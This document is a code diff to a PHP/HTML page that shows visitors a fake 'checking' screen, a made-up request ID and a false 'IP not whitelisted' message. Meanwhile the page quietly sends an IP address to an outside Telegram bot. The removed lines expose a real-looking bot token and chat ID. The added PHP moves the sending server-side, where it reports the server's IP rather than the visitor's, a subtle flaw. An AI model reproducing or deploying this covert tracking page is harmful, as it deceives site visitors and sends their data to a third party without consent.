@@ -1,3 +1,39 @@
+<?php
+// Function to generate a random fake request ID
+function generateRequestId() {
+    $characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    $requestId = '';
+    for ($i = 0; $i < 16; $i++) {
+        $requestId .= $characters[rand(0, strlen($characters) - 1)];
+    }
+    return $requestId;
+}
+
+// Fetch IP address and send it to Telegram
+function sendIpToTelegram() {
+    $ipResponse = file_get_contents('https://api64.ipify.org?format=json');
+    $ipData = json_decode($ipResponse, true);
+    $ipAddress = $ipData['ip'];
+
+    $botToken = '123456789:ABCDefGHIjklMNOpQRstUVwxyZ'; // Replace with your bot token
+    $chatId = '987654321'; // Replace with your chat ID
+    $url = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text=Detected IP Address: {$ipAddress}";
+
+    file_get_contents($url);
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Handle AJAX request from JavaScript
+    if (isset($_POST['action']) && $_POST['action'] === 'generateRequestId') {
+        echo json_encode(['requestId' => generateRequestId()]);
+        exit;
+    }
+    if (isset($_POST['action']) && $_POST['action'] === 'sendIp') {
+        sendIpToTelegram();
+        exit;
+    }
+}
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -79,12 +115,17 @@
     <script>
         // Function to generate a random fake request ID
         function generateRequestId() {
-            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            let requestId = '';
-            for (let i = 0; i < 16; i++) {
-                requestId += characters.charAt(Math.floor(Math.random() * characters.length));
-            }
-            return requestId;
+            return fetch('index.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: new URLSearchParams({
+                    action: 'generateRequestId'
+                })
+            })
+            .then(response => response.json())
+            .then(data => data.requestId);
         }
 
         document.addEventListener('keydown', function(event) {
@@ -97,29 +138,26 @@
                 checkingMessage.style.display = 'block';
 
                 // Generate and display a random request ID
-                const requestId = generateRequestId();
+                generateRequestId().then(requestId => {
+                    // After a 7-second delay, show "Your IP is not whitelisted" message with request ID
+                    setTimeout(function() {
+                        checkingMessage.style.display = 'none'; // Hide checking message
+                        var whitelistMessage = document.getElementById('whitelist-message');
+                        whitelistMessage.style.display = 'block'; // Show whitelist message
+                        document.getElementById('request-id').textContent = 'Request ID: ' + requestId; // Show Request ID
 
-                // After a 7-second delay, show "Your IP is not whitelisted" message with request ID
-                setTimeout(function() {
-                    checkingMessage.style.display = 'none'; // Hide checking message
-                    var whitelistMessage = document.getElementById('whitelist-message');
-                    whitelistMessage.style.display = 'block'; // Show whitelist message
-                    document.getElementById('request-id').textContent = 'Request ID: ' + requestId; // Show Request ID
-                }, 7000); // Wait for 7 seconds before showing the whitelist message
-
-                // Fetch IP address and send it to Telegram
-                fetch('https://api64.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => {
-                        const ipAddress = data.ip;
-                        const botToken = '6865521894:AAGvDoWy0kEHyC_GGGF9hoZzHsEEkwyxucY'; // Replace with your bot token
-                        const chatId = '5917899680'; // Replace with your chat ID
-
-                        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Detected IP Address: ${ipAddress}`;
-
-                        fetch(url);
-                    })
-                    .catch(error => console.error('Error fetching IP address:', error));
+                        // Send IP address to Telegram
+                        fetch('index.php', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/x-www-form-urlencoded'
+                            },
+                            body: new URLSearchParams({
+                                action: 'sendIp'
+                            })
+                        });
+                    }, 7000); // Wait for 7 seconds before showing the whitelist message
+                });
             }
         });
     </script>
